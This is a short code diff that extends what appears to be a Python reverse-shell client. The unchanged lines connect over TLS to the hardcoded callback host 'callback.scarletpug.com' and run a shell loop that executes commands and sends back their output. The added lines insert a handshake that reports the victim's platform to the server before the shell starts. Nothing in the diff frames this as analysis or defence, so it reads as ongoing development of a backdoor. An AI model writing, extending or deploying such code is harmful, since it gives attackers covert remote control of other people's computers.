@@ -222,6 +222,16 @@ def shell(s):
             result = result.decode()
             reliable_send(s, result)
 
+def handshake(s):
+    """
+    Sends an initial handshake message to the server.
+    Useful for session registration and connection validation.
+    """
+    try:
+        reliable_send(s, {"status": "connected", "platform": platform})
+    except Exception as e:
+        print(f"[!] Handshake failed: {e}")
+
 
 def connection():
     host = 'callback.scarletpug.com'
@@ -237,7 +247,10 @@ def connection():
             s = context.wrap_socket(raw_socket, server_hostname=host)
 
             print("[+] Connected to server over TLS")
+
+            handshake(s)  # <-- send handshake before entering shell
             shell(s)
+
             s.close()
             break
         except Exception as e:
